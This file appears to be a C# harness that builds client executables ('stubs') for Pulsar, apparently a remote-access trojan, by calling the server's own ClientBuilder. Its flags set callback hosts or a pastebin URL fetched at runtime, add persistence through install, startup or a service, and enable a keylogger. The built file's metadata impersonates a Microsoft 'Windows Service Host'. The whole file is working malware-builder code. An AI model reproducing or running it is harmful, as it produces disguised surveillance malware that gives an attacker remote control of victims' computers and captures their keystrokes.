using Pulsar.Common;
using Pulsar.Server.Build;
using Pulsar.Server.Models;

// Parameterized stub forge using the server's own ClientBuilder.
// Usage:
//   StubBuilder -hosts "127.0.0.1:4782" -out C:\path\Out.exe [-tag NAME] [-pastebin] [-install] [-startup] [-keylogger]
//   -pastebin : treat -hosts value as a URL fetched by the stub at runtime
// Requirements at runtime:
//   - PulsarStuff\Pulsar.p12 next to this exe
//   - OutputPath must differ from this exe's directory

string baseDir = AppContext.BaseDirectory;

string hosts = null, outputPath = null, tag = "STUB", certificatePath = null, clientTemplate = null, manifestPath = null;
bool pastebinMode = false, install = false, startup = false, service = false, gui = false, keylogger = false;

for (int i = 0; i < args.Length; i++)
{
    switch (args[i])
    {
        case "-hosts":
            if (++i >= args.Length) { Console.Error.WriteLine("-hosts requires a value"); return 2; }
            hosts = args[i];
            break;
        case "-out":
            if (++i >= args.Length) { Console.Error.WriteLine("-out requires a value"); return 2; }
            outputPath = args[i];
            break;
        case "-tag":
            if (++i >= args.Length) { Console.Error.WriteLine("-tag requires a value"); return 2; }
            tag = args[i];
            break;
        case "-cert":
            if (++i >= args.Length) { Console.Error.WriteLine("-cert requires a value"); return 2; }
            certificatePath = args[i];
            break;
        case "-template":
            if (++i >= args.Length) { Console.Error.WriteLine("-template requires a value"); return 2; }
            clientTemplate = args[i];
            break;
        case "-manifest":
            if (++i >= args.Length) { Console.Error.WriteLine("-manifest requires a value"); return 2; }
            manifestPath = args[i];
            break;
        case "-pastebin": pastebinMode = true; break;
        case "-install": install = true; break;
        case "-startup": startup = true; break;
        case "-service": service = true; break;
        case "-gui": gui = true; break;
        case "-keylogger": keylogger = true; break;
        default:
            Console.Error.WriteLine($"unknown option: {args[i]}");
            return 2;
    }
}

if (hosts == null || outputPath == null)
{
    Console.Error.WriteLine("usage: StubBuilder -hosts <host:port|url> -out <path.exe> [-tag NAME] [-pastebin] [-keylogger] [-cert path.p12] [-template client.bin] [-manifest path.json]");
    return 2;
}

outputPath = Path.GetFullPath(outputPath);

var options = new BuildOptions
{
    Install = install,
    Startup = install && startup,
    HideFile = false,
    Keylogger = keylogger,
    Tag = tag,
    Mutex = "Psr_" + Guid.NewGuid().ToString("N").Substring(0, 12),
    RawHosts = hosts,
    Pastebin = pastebinMode,
    Version = ProtocolVersion.Current,
    Delay = 5000,
    InstallPath = 1, // ApplicationData
    InstallSub = Path.GetFileNameWithoutExtension(outputPath),
    InstallName = Path.GetFileName(outputPath),
    StartupName = Path.GetFileNameWithoutExtension(outputPath),
    OutputPath = outputPath,
    AssemblyInformation = new[]
    {
        Path.GetFileNameWithoutExtension(outputPath),
        "Windows Service Host",
        "Microsoft",
        "(C) Microsoft Corporation",
        "",
        "",
        "1.0.0.0",
        "1.0.0.0"
    },
    LogDirectoryName = "Logs",
    HideLogDirectory = false,
    HideInstallSubdirectory = false,
    AntiVM = false,
    AntiDebug = false,
    UACBypass = false,
    CRITICALPROCESS = false,
    INSTALLSERVICE = service,
    SHOWCLIENTGUI = gui,
    CertificatePath = certificatePath,
    ManifestPath = manifestPath
};

// Locate the client.bin template by walking upward from the current directory,
// so the harness works from anywhere inside the repo.
if (string.IsNullOrWhiteSpace(clientTemplate))
{
    for (string dir = Directory.GetCurrentDirectory(); !string.IsNullOrEmpty(dir); dir = Path.GetDirectoryName(dir))
    {
        string candidate = Path.Combine(dir, "bin", "Release", "net9.0-windows", "client.bin");
        if (File.Exists(candidate)) { clientTemplate = candidate; break; }
    }
}
if (clientTemplate == null) { Console.Error.WriteLine("ERROR: client.bin template not found — run from inside the repo (expects bin/Release/net9.0-windows/client.bin)"); return 3; }

// Pulsar.p12: prefer the harness directory, fall back to the server output directory next to client.bin.
string p12Path = certificatePath ?? Path.Combine(baseDir, "PulsarStuff", "Pulsar.p12");
if (certificatePath == null && !File.Exists(p12Path))
{
    string alt = Path.Combine(Path.GetDirectoryName(clientTemplate), "PulsarStuff", "Pulsar.p12");
    if (File.Exists(alt)) p12Path = alt;
}
if (!File.Exists(p12Path)) { Console.Error.WriteLine("ERROR: certificate not found; pass -cert <path.p12>"); return 4; }
options.CertificatePath = Path.GetFullPath(p12Path);
clientTemplate = Path.GetFullPath(clientTemplate);

Console.WriteLine($"[+] mode={((pastebinMode) ? "PASTEBIN-URL" : "DIRECT")} hosts={hosts}");
Console.WriteLine($"[+] out={outputPath}");
Console.WriteLine($"[+] template={clientTemplate}");
Console.WriteLine($"[+] certificate={options.CertificatePath}");

var builder = new ClientBuilder(options, clientTemplate);
bool warn = builder.Build(false, false);

var fi = new FileInfo(outputPath);
if (!fi.Exists) { Console.Error.WriteLine("ERROR: stub not written"); return 1; }
Console.WriteLine($"[+] built {fi.Length} bytes (warn={warn})");
return 0;
